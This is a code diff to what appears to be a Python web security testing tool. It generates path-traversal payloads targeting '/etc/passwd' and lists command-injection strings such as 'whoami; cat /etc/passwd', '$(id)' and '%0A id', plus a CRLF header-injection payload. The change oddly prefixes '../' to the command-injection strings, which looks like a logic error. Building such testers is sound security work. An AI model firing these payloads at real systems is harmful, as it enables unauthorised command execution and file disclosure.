@@ -125,13 +125,14 @@ def load_payloads_from_file(file_path):
         print(f"Error reading file '{file_path}'. Please check the file path and try again.")
         return None
 
-# Generate LFI payloads with increasing traversal levels
-def generate_lfi_payloads(base_path, max_levels):
+# Generate traversal payloads for various tests
+def generate_traversal_payloads(base_payloads, max_levels):
     payloads = []
-    for i in range(1, max_levels + 1):
-        traversal = "../" * i
-        payload = traversal + base_path
-        payloads.append(payload)
+    for base_payload in base_payloads:
+        for i in range(1, max_levels + 1):
+            traversal = "../" * i
+            payload = traversal + base_payload
+            payloads.append(payload)
     return payloads
 
 # XSS Testing for both stored and reflected XSS
@@ -587,23 +588,11 @@ def handle_menu_choice(choice):
             elif choice == 6:
                 base_path = "etc/passwd"
                 max_levels = 10
-                payloads = generate_lfi_payloads(base_path, max_levels)
+                payloads = generate_traversal_payloads([base_path], max_levels)
             elif choice == 7:
-                payloads = [
-                    "id; ls",
-                    "whoami; cat /etc/passwd",
-                    "uname -a; ls -la",
-                    "`id`",
-                    "$(id)",
-                    "`uname -a`",
-                    "&& whoami",
-                    "|| uname -a",
-                    "| id",
-                    ";& id",
-                    "|& id",
-                    "%0A id",
-                    "%0A uname -a"
-                ]
+                base_paths = ["id; ls", "whoami; cat /etc/passwd", "uname -a; ls -la", "`id`", "$(id)", "`uname -a`", "&& whoami", "|| uname -a", "| id", ";& id", "|& id", "%0A id", "%0A uname -a"]
+                max_levels = 3
+                payloads = generate_traversal_payloads(base_paths, max_levels)
             elif choice == 8:
                 payloads = [
                     "\r\nX-Test: injected-header",
